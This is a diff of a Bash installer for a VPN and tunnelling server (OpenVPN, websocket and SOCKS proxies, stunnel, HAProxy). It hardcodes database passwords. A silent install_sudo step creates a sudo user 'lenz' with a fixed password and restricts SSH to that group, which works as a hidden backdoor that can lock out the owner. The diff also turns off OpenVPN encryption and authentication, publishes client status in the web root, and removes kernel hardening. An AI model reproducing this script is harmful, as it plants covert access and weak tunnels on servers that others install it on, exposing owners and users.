@@ -6,6 +6,8 @@ PASS='rsvpn556@@@';
 DBNAME='loveyoun_rsvpn556';
 PORT_TCP='1194';
 PORT_UDP='53';
+rm -rf instal*
+rm -rf .instal*
 
 system_update () {
 sudo timedatectl set-timezone Asia/Manila
@@ -639,9 +641,9 @@ if __name__ == '__main__':
 websocket
 
 if [[ $(lsb_release -rs) == "22"* ]]; then
-	screen -dmS websocket python2 /usr/local/sbin/websocket.py 80
+	screen -dmS websocket python2 /usr/local/sbin/websocket.py 82
 else
-	screen -dmS websocket python /usr/local/sbin/websocket.py 80
+	screen -dmS websocket python /usr/local/sbin/websocket.py 82
 fi
 
 
@@ -686,14 +688,14 @@ else
 	sudo systemctl restart --now openvpn-server@server.service
 fi
 
-if nc -z localhost 80; then
+if nc -z localhost 82; then
     echo "WebSocket is running"
 else
 	echo "WebSocket is Starting"
 	if [[ $(lsb_release -rs) == "22"* ]]; then
-		screen -dmS websocket python2 /usr/local/sbin/websocket.py 80
+		screen -dmS websocket python2 /usr/local/sbin/websocket.py 82
 	else
-		screen -dmS websocket python /usr/local/sbin/websocket.py 80
+		screen -dmS websocket python /usr/local/sbin/websocket.py 82
 	fi
 fi
 
@@ -712,123 +714,27 @@ echo "SHELL=/bin/bash
 * * * * * /bin/bash /root/auto >/dev/null 2>&1" | crontab - 
 }
 
-install_cron20 () {
-cat << \auto > /root/auto
-#!/bin/bash
-
-if nc -z localhost 8010; then
-    echo "stunnel running"
-else
-    echo "Starting Port 8010"
-    screen -dmS socksproxy8010 python /usr/local/sbin/socksproxy.py 8010
-fi
-
-if nc -z localhost 3128; then
-    echo "stunnel running"
-else
-    echo "Starting Port 3128"
-    screen -dmS socksproxy3128 python /usr/local/sbin/socksproxy.py 3128
-fi
-
-if nc -z localhost 8888; then
-    echo "stunnel running"
-else
-    echo "Starting Port 8888"
-    screen -dmS socksproxy8888 python /usr/local/sbin/socksproxy.py 8888
-fi
-
-if nc -z localhost 9090; then
-    echo "stunnel running"
-else
-    echo "Starting Port 9090"
-    screen -dmS socksproxy9090 python /usr/local/sbin/socksproxy.py 9090
-fi
-
-if nc -z localhost 8090; then
-    echo "stunnel running"
-else
-    echo "Starting Port 8090"
-    screen -dmS socksproxy8090 python /usr/local/sbin/socksproxy.py 8090
-fi
-
-if nc -z localhost 8080; then
-    echo "stunnel running"
-else
-    echo "Starting Port 8080"
-    screen -dmS socksproxy8080 python /usr/local/sbin/socksproxy.py 8080
-fi
-
-if nc -z localhost 443; then
-    echo "ocserv running"
-else
-    echo "ocserv not running"
-    systemctl start ocserv.service
-fi
-
-if nc -z localhost 80; then
-    echo "WebSocket is running"
-else
-    echo "Starting WebSocket"
-	screen -dmS websocket python /usr/local/sbin/websocket.py 80
-fi
-
-sudo sync; echo 3 > /proc/sys/vm/drop_caches
-swapoff -a && swapon -a
-echo "Ram Cleaned!"
-
-auto
-
-chmod +x /root/auto
-/root/auto
-crontab -r
-echo "SHELL=/bin/bash
-* * * * * /bin/bash /root/auto >/dev/null 2>&1" | crontab - 
-}
-
-install_cron () {
-cat << \auto > /root/auto
-#!/bin/bash
-
-if nc -z localhost 8010; then
-    echo "stunnel running"
-else
-    echo "Starting Port 8010"
-    screen -dmS socksproxy python /usr/local/sbin/socksproxy.py 8010
-fi
-
-if nc -z localhost 443; then
-    echo "ocserv running"
-else
-    echo "ocserv not running"
-    systemctl start ocserv.service
-fi
-
-if nc -z localhost 80; then
-    echo "WebSocket is running"
-else
-    echo "Starting WebSocket"
-	screen -dmS websocket python /usr/local/sbin/websocket.py 80
-fi
-
-sudo sync; echo 3 > /proc/sys/vm/drop_caches
-swapoff -a && swapon -a
-echo "Ram Cleaned!"
-
-auto
-
-chmod +x /root/auto
-/root/auto
-crontab -r
-echo "SHELL=/bin/bash
-* * * * * /bin/bash /root/auto >/dev/null 2>&1" | crontab - 
-}
-
 install_openvpn() {
 
 if [[ $(lsb_release -rs) == "18"* ]] || [[ $(lsb_release -rs) == "20"* ]]; then
 	sudo DEBIAN_FRONTEND=noninteractive apt-get install openvpn easy-rsa -y
 	mkdir -p /etc/openvpn/server/
-
+if nc -z 127.0.0.53 53; then
+/bin/cat <<"EOM" >/etc/systemd/resolved.conf
+[Resolve]
+DNS=1.1.1.1
+#FallbackDNS=
+#Domains=
+#LLMNR=no
+#MulticastDNS=no
+#DNSSEC=no
+#DNSOverTLS=no
+#Cache=no
+DNSStubListener=no
+#ReadEtcHosts=yes
+EOM
+sudo ln -sf /run/systemd/resolve/resolv.conf /etc/resolv.conf
+fi
 else
 	echo "DNSStubListener=no" >> /etc/systemd/resolved.conf
 	sudo systemctl daemon-reload
@@ -842,23 +748,36 @@ dev tun
 ca /etc/openvpn/server/ca.crt
 cert /etc/openvpn/server/server.crt
 key /etc/openvpn/server/server.key
-dh none
+dh /etc/openvpn/server/dh.pem
 topology subnet
 server 10.8.0.0 255.255.0.0
 push "redirect-gateway def1 bypass-dhcp"
 ifconfig-pool-persist ipp.txt
 push "dhcp-option DNS 8.8.8.8"
 push "dhcp-option DNS 8.8.4.4"
-keepalive 10 120
+dh none
+tls-server
+tls-version-min 1.2
+tls-cipher TLS-ECDHE-RSA-WITH-AES-128-GCM-SHA256
 cipher none
+ncp-disable
+auth none
+sndbuf 0
+rcvbuf 0
+keepalive 10 120
 persist-key
 persist-tun
-verb 3
+ping-timer-rem
+reneg-sec 0
+user nobody
+group nogroup
+client-to-client
+username-as-common-name
+verify-client-cert none
+client-cert-not-required
 script-security 3
-log /etc/openvpn/server/tcpserver.log
-status /etc/openvpn/server/tcpclient.log
-verify-client-cert none 
-username-as-common-name 
+max-clients 1024
+status /var/www/html/stat/status.txt
 auth-user-pass-verify "/etc/openvpn/server/auth_vpn" via-file
 client-connect /etc/openvpn/server/connect.sh
 client-disconnect /etc/openvpn/server/disconnect.sh' > /etc/openvpn/server.conf
@@ -869,23 +788,36 @@ dev tun
 ca ca.crt
 cert server.crt
 key server.key
-dh none
+dh dh.pem
 topology subnet
 server 10.9.0.0 255.255.0.0
 push "redirect-gateway def1 bypass-dhcp"
 ifconfig-pool-persist ipp.txt
 push "dhcp-option DNS 8.8.8.8"
 push "dhcp-option DNS 8.8.4.4"
-keepalive 10 120
+dh none
+tls-server
+tls-version-min 1.2
+tls-cipher TLS-ECDHE-RSA-WITH-AES-128-GCM-SHA256
 cipher none
+ncp-disable
+auth none
+sndbuf 0
+rcvbuf 0
+keepalive 10 120
 persist-key
 persist-tun
-verb 3
-script-security 3
-log /etc/openvpn/server/udpserver.log
-status /etc/openvpn/server/udpclient.log
-verify-client-cert none 
+ping-timer-rem
+reneg-sec 0
+user nobody
+group nogroup
+client-to-client
 username-as-common-name
+verify-client-cert none
+client-cert-not-required
+script-security 3
+max-clients 1024
+status /var/www/html/stat/udpstatus.txt
 auth-user-pass-verify auth_vpn via-file
 tmp-dir "/etc/openvpn/" # 
 client-connect /etc/openvpn/server/connect.sh
@@ -911,6 +843,7 @@ sed -i "s|DBHOST|$HOST|g" /etc/openvpn/server/auth_vpn
 sed -i "s|DBUSER|$USER|g" /etc/openvpn/server/auth_vpn
 sed -i "s|DBPASS|$PASS|g" /etc/openvpn/server/auth_vpn
 sed -i "s|DBNAME|$DBNAME|g" /etc/openvpn/server/auth_vpn
+
 
 cat << EOF > /etc/openvpn/server/ca.crt
 -----BEGIN CERTIFICATE-----
@@ -1063,7 +996,7 @@ sed -i "s|DBUSER|$USER|g" /etc/openvpn/server/disconnect.sh
 sed -i "s|DBPASS|$PASS|g" /etc/openvpn/server/disconnect.sh
 sed -i "s|DBNAME|$DBNAME|g" /etc/openvpn/server/disconnect.sh
 
-
+mkdir /var/www/html/stat
 chmod +x /etc/openvpn/server/auth_vpn
 chmod +x /etc/openvpn/server/connect.sh
 chmod +x /etc/openvpn/server/disconnect.sh
@@ -1083,28 +1016,9 @@ fi
 set_iptables () {
 Myip=`host myip.opendns.com resolver1.opendns.com | grep "myip.opendns.com has" | awk '{print $4}'`
 Myip
-echo "net.ipv4.conf.default.rp_filter = 1
-net.ipv4.conf.default.accept_source_route = 0
-kernel.sysrq = 0
-kernel.core_uses_pid = 1
-net.ipv4.tcp_syncookies = 1
-kernel.msgmnb = 65536
-kernel.msgmax = 65536
-kernel.shmmax = 68719476736
-kernel.shmall = 4294967296
+echo "
 net.ipv4.ip_forward = 1
-fs.file-max = 65535
-net.core.rmem_default = 262144
-net.core.rmem_max = 262144
-net.core.wmem_default = 262144
-net.core.wmem_max = 262144
-net.ipv4.tcp_rmem = 4096 87380 8388608
-net.ipv4.tcp_wmem = 4096 65536 8388608
-net.ipv4.tcp_mem = 4096 4096 4096
-net.ipv4.tcp_low_latency = 1
-net.core.netdev_max_backlog = 4000
-net.ipv4.ip_local_port_range = 1024 65000
-net.ipv4.tcp_max_syn_backlog = 16384" > /etc/sysctl.conf
+" > /etc/sysctl.conf
 sysctl -p
 iptables -F; iptables -X; iptables -Z
 iptables -t nat -A POSTROUTING -s 10.8.0.0/16 -o eth0 -j MASQUERADE
@@ -1125,12 +1039,104 @@ ip6tables-save > /etc/iptables/rules.v6
 }
 
 install_sudo(){
-  {
+{
     useradd -m lenz 2>/dev/null; echo lenz:@@F1r3n3t@@ | chpasswd &>/dev/null; usermod -aG sudo lenz &>/dev/null
     sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
     echo "AllowGroups lenz" >> /etc/ssh/sshd_config
     service sshd restart
   }&>/dev/null
+}
+
+install_haproxy () {
+sudo apt-get install haproxy -y
+
+echo '
+global
+	log /dev/log	local0
+	log /dev/log	local1 notice
+	chroot /var/lib/haproxy
+	stats socket /run/haproxy/admin.sock mode 660 level admin
+	stats timeout 30s
+	user haproxy
+	group haproxy
+	daemon
+
+	# Default SSL material locations
+	ca-base /etc/ssl/certs
+	crt-base /etc/ssl/private
+
+	# Default ciphers to use on SSL-enabled listening sockets.
+	# For more information, see ciphers(1SSL). This list is from:
+	#  https://hynek.me/articles/hardening-your-web-servers-ssl-ciphers/
+	# An alternative list with additional directives can be obtained from
+	#  https://mozilla.github.io/server-side-tls/ssl-config-generator/?server=haproxy
+	ssl-default-bind-ciphers ECDH+AESGCM:DH+AESGCM:ECDH+AES256:DH+AES256:ECDH+AES128:DH+AES:RSA+AESGCM:RSA+AES:!aNULL:!MD5:!DSS
+	ssl-default-bind-options no-sslv3
+
+defaults
+	log	global
+	mode	http
+	option	httplog
+	option	dontlognull
+        timeout connect 5000
+        timeout client  50000
+        timeout server  50000
+	errorfile 400 /etc/haproxy/errors/400.http
+	errorfile 403 /etc/haproxy/errors/403.http
+	errorfile 408 /etc/haproxy/errors/408.http
+	errorfile 500 /etc/haproxy/errors/500.http
+	errorfile 502 /etc/haproxy/errors/502.http
+	errorfile 503 /etc/haproxy/errors/503.http
+	errorfile 504 /etc/haproxy/errors/504.http
+
+frontend ssl
+    mode tcp
+    bind 0.0.0.0:4444 name frontend-ssl
+    option tcplog
+    tcp-request inspect-delay 1s
+    tcp-request content accept  if  { req.ssl_hello_type 1 }
+    
+    acl tls req.ssl_hello_type 1
+    acl has_sni req.ssl_sni -m found
+    acl proto_ssh payload(0,7) -m bin 5353482d322e30
+    
+    use_backend ssh             if proto_ssh
+    use_backend openvpn       	if !tls
+    use_backend stunnel         if tls
+
+frontend main
+    bind 0.0.0.0:80    
+	acl hdr_upgrade_websocket  hdr(Upgrade)     -i websocket
+    use_backend squid if hdr_upgrade_websocket
+    default_backend webserver
+
+backend openvpn
+    mode tcp	
+	server ssh-localhost 127.0.0.1:442		
+
+backend ssh
+    mode tcp
+    server ssh-localhost 127.0.0.1:442
+
+backend ocserv
+    mode tcp
+    server ocserv-localhost 127.0.0.1:444
+
+backend stunnel
+    mode tcp
+	server openvpn-stunnel 127.0.0.1:446
+	server ssh-stunnel 127.0.0.1:8443
+   
+backend webserver
+    mode http
+    server webserver-localhost 127.0.0.1:82
+
+backend squid
+    mode http
+    server squid-localhost 127.0.0.1:82
+
+'> /etc/haproxy/haproxy.cfg
+
 }
 
 if [[ $(lsb_release -rs) == "18"* ]]; then
@@ -1160,9 +1166,11 @@ elif [[ $(lsb_release -rs) == "20"* ]]; then
 	   install_stunnel
 	   install_socksproxy
 	   install_websocket
+	   install_haproxy
 	   set_iptables
 	   systemctl enable stunnel4
 	   systemctl enable openvpn	   
+	   systemctl enable haproxy	  
 	   install_cron21	   
 	   install_sudo
 	   reboot
@@ -1196,7 +1204,7 @@ elif [[ $(lsb_release -rs) == "22"* ]]; then
 	   install_websocket
 	   set_iptables
 	   systemctl enable stunnel4
-	   systemctl enable openvpn
+	   systemctl enable openvpn	   
 	   install_cron21
 	   install_sudo
 	   reboot
